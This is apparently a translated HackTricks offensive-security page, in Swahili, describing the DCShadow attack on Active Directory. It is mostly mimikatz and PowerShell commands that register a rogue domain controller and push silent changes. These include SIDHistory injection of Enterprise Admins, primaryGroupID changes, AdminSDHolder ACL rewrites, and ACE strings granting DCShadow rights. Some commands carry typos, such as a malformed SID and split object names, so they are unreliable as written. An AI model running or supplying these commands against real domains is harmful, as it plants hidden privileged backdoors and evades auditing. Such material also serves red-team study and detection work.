{{#include ../../banners/hacktricks-training.md}}

# DCShadow

Inajisajili **Domain Controller** mpya katika AD na kuitumia **kushinikiza sifa** (SIDHistory, SPNs...) kwenye vitu vilivyotajwa **bila** kuacha **maandishi** yoyote kuhusu **mabadiliko**. Unahitaji ruhusa za DA na uwe ndani ya **domain ya mzizi**.\
Kumbuka kwamba ikiwa utatumia data mbaya, maandiko mabaya yatatokea.

Ili kutekeleza shambulio unahitaji mifano 2 ya mimikatz. Moja yao itaanzisha seva za RPC kwa ruhusa za SYSTEM (lazima uonyeshe hapa mabadiliko unayotaka kufanya), na mfano mwingine utatumika kushinikiza thamani:
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
Kumbuka kwamba **`elevate::token`** haitafanya kazi katika `mimikatz1` session kwani hiyo iliongeza mamlaka ya thread, lakini tunahitaji kuongeza **mamlaka ya mchakato**.\
Unaweza pia kuchagua na "LDAP" object: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Unaweza kusukuma mabadiliko kutoka kwa DA au kutoka kwa mtumiaji mwenye ruhusa hizi za chini:

- Katika **object ya domain**:
- _DS-Install-Replica_ (Ongeza/ondoa Replica katika Domain)
- _DS-Replication-Manage-Topology_ (Simamisha Topolojia ya Replika)
- _DS-Replication-Synchronize_ (Sawaisha Replika)
- **Object za Sites** (na watoto wake) katika **Configuration container**:
- _CreateChild and DeleteChild_
- Object ya **kompyuta ambayo imeandikishwa kama DC**:
- _WriteProperty_ (Sio Andika)
- **Object ya lengo**:
- _WriteProperty_ (Sio Andika)

Unaweza kutumia [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) kutoa ruhusa hizi kwa mtumiaji asiye na mamlaka (kumbuka kwamba hii itacha baadhi ya kumbukumbu). Hii ni ya kikomo zaidi kuliko kuwa na mamlaka ya DA.\
Kwa mfano: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Hii inamaanisha kwamba jina la mtumiaji _**student1**_ anapokuwa kwenye mashine _**mcorp-student1**_ ana ruhusa za DCShadow juu ya object _**root1user**_.

## Kutumia DCShadow kuunda backdoors
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Chage PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
## Shadowception - Toa DCShadow ruhusa kwa kutumia DCShadow (hakuna kumbukumbu za ruhusa zilizobadilishwa)

Tunahitaji kuongeza ACEs zifuatazo na SID ya mtumiaji wetu mwishoni:

- Kwenye kituo cha kikoa:
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- Kwenye kituo cha kompyuta ya mshambuliaji: `(A;;WP;;;UserSID)`
- Kwenye kituo cha mtumiaji wa lengo: `(A;;WP;;;UserSID)`
- Kwenye kituo cha Tovuti katika kontena ya Mipangilio: `(A;CI;CCDC;;;UserSID)`

Ili kupata ACE ya sasa ya kitu: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

Kumbuka kwamba katika kesi hii unahitaji kufanya **mabadiliko kadhaa,** si moja tu. Hivyo, katika **mimikatz1 session** (RPC server) tumia parameter **`/stack` na kila mabadiliko** unayotaka kufanya. Kwa njia hii, utahitaji tu **`/push`** mara moja ili kutekeleza mabadiliko yote yaliyokamatwa kwenye seva ya rogue.

[**Taarifa zaidi kuhusu DCShadow katika ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

{{#include ../../banners/hacktricks-training.md}}
